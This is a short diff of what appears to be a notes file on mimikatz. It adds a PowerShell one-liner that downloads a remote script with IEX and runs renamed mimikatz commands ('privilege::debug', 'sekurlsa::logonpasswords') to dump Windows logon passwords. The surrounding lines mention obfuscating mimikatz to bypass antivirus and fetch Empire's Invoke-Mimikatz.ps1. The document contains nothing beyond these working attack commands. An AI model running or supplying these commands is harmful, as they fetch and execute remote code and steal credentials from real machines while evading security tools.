@@ -18,6 +18,10 @@ https://github.com/gentilkiwi/mimikatz/issues/83
 Autentication proxy for powershell
 (New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 
+
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mttstt/mimi/master/Kingdom3.ps1");Invoke-Mimidogz -Com
+mand "privilege::debug";Invoke-Mimidogz -command "sekurlsa::logonpasswords"
+
 # Script to obfuscate mimikatz and bypass AV
     
     wget https://raw.githubusercontent.com/EmpireProject/Empire/7a39a55f127b1aeb951b3d9d80c6dc64500cacb5/data/module_source/credentials/Invoke-Mimikatz.ps1
